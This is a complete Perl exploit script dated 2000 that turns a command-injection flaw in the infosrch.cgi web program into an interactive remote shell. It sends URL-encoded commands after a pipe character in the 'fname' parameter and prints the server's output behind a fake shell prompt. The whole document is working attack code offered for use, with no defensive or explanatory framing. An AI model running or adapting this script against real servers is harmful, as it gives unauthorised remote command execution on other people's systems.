#!/usr/bin/perl -w
# infosearch.cgi interactive shell. 
# usage: ./infosh.pl hostname
# 3/4/00
# --rpc <h@ckz.org>

use IO::Socket;
use CGI ":escape";
$|++;

die "usage: $0 host\n" unless(@ARGV == 1);
($host) = shift @ARGV;

$cgi = "/cgi-bin/infosrch.cgi?cmd=getdoc&db=man&fname=|";

# url encode and send a command.
sub send_cmd
{
	my($url_command) = $cgi . CGI::escape(shift);
	$s = IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>80,Proto=>"tcp");
	if(!$s) { die "denied.\n"; }	
	print $s "GET $url_command HTTP/1.0\r\n";
	print $s "User-Agent: \r\n\r\n";
	@result = <$s>;
	shift @result until $result[0] =~ /^\r\n/; # uninteresting data. 
	shift @result; $#result--;		
return @result;
}

# draw a pseudo prompt. i like "\h:\w \$ ".
sub prompt
{
	@res = send_cmd("/sbin/pwd");	
	chomp($pwd = $res[0]);
	print "$host:", $pwd, "\$ ";
}

prompt;
while(!eof(STDIN)) {
	chomp($cmd = <STDIN>);
	print send_cmd($cmd);
	prompt;
}	 

